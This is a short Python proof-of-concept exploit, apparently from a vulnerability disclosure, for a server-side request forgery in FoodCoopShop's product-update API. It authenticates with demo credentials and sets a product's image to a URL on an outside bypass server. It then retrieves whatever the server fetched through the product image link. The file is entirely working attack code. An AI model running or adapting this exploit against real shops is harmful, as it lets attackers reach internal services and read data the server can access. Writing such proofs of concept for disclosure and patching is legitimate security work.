import requests
import json
from requests.auth import HTTPBasicAuth

SERVER_URL = 'http://localhost:8001'
EMAIL = 'fcs-demo-fleisch-hersteller@mailinator.com'
PASSWORD = 'foodcoopshop'
BYPASS_SERVER_URL = 'http://192.168.112.1:8888/1.png'

if __name__ == '__main__':
    session = requests.Session()
    # Use credentials to send the request
    auth = HTTPBasicAuth(EMAIL, PASSWORD)
    product_list_request = session.get(f"{SERVER_URL}/api/getProducts", auth=auth)
    products = json.loads(product_list_request.text)["products"]
    product = products[0]
    product_id = product["id_product"]

    # Trigger SSRF
    upload_url = f'{SERVER_URL}/api/updateProducts.json'
    upload_data = f"data[data][0][remoteProductId]={product_id}&data[data][0][image]={BYPASS_SERVER_URL}"
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    upload_response = session.post(upload_url, data=upload_data, allow_redirects=True, auth=auth, headers=header)
    upload_response_json = json.loads(upload_response.text)
    # Check the existence of status key in the response
    if "status" in upload_response_json and upload_response_json["status"] == True:
        # Retrieve file back
        product_list_request = session.get(f"{SERVER_URL}/api/getProducts", auth=auth)
        products = json.loads(product_list_request.text)["products"]
        product = products[0]
        image_url = product["image"]["src"]
        image_response = session.get(image_url)
        print("Response:")
        print(image_response.text)
